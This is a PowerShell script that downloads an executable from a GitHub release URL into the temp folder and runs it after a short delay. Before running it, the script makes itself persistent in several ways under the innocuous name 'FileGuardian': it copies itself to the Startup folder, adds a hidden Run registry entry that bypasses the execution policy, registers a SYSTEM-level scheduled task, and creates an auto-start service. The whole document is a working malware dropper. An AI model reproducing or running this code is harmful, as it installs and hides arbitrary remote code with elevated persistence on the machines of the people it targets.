$FileURL = 'https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe'
$TargetPath = "$env:LOCALAPPDATA\Temp\scripthelper.exe"
$LaunchDelay = 3
$WindowStyle = 'Hidden'
$StartupScriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup/FileGuardian.ps1"
$StartupRegPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$TaskName = 'FileGuardianTask'
$ServiceName = 'FileGuardianService'

function Set-Persistence {
    param($SourcePath)

    try {
        if (-not (Test-Path $StartupScriptPath)) {
            Copy-Item -Path $SourcePath -Destination $StartupScriptPath -Force
            Write-Host "[+] Copied script to Startup folder."
        }

        $command = "powershell.exe -windowstyle $WindowStyle -executionpolicy bypass -file `"$StartupScriptPath`""
        Set-ItemProperty -Path $StartupRegPath -Name 'FileGuardian' -Value $command -Force
        Write-Host "[+] Registry entry created."

        $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-windowstyle $WindowStyle -executionpolicy bypass -file `"$StartupScriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

        $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
        Register-ScheduledTask -TaskName $TaskName -InputObject $task -Force
        Write-Host "[+] Scheduled task created."

        $servicePath = "$env:SystemRoot\System32\svchost.exe"
        $serviceArgs = "-k netsvcs -p -s $ServiceName"
        if (-not (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue)) {
            New-Service -Name $ServiceName -BinaryPathName "$servicePath $serviceArgs" -StartupType Automatic -Description 'File Guardian Service'
            Start-Service -Name $ServiceName
            Write-Host "[+] Service created and started."
        } else {
            Write-Host "[*] Service already exists."
        }

    } catch {
        Write-Host "[!] Set-Persistence failed: $_"
        Pause
    }
}

function Run-Payload {
    param($PayloadPath)

    try {
        if (-not (Test-Path $PayloadPath)) {
            Write-Host "[*] File not found — skipping download/execution."
        } else {
            Start-Sleep -Seconds $LaunchDelay
            & $PayloadPath
            Write-Host "[+] Executed: $PayloadPath"
        }
    } catch {
        Write-Host "[!] Run-Payload failed: $_"
        Pause
    }
}

try {
    # Download payload (optional, can be skipped if already local)
    $rand = [System.IO.Path]::GetRandomFileName() + ".exe"
    $downloadPath = Join-Path $env:TEMP $rand

    try {
        Invoke-WebRequest -Uri $FileURL -OutFile $downloadPath -UseBasicParsing
        Write-Host "[+] File downloaded to $downloadPath"
    } catch {
        Write-Host "[!] Download failed: $_"
        Pause
    }

    Set-Persistence -SourcePath $PSCommandPath  # if running from a file, this is the current script
    Run-Payload -PayloadPath $downloadPath

} catch {
    Write-Host "[!] Script execution failed: $_"
    Pause
}

Pause
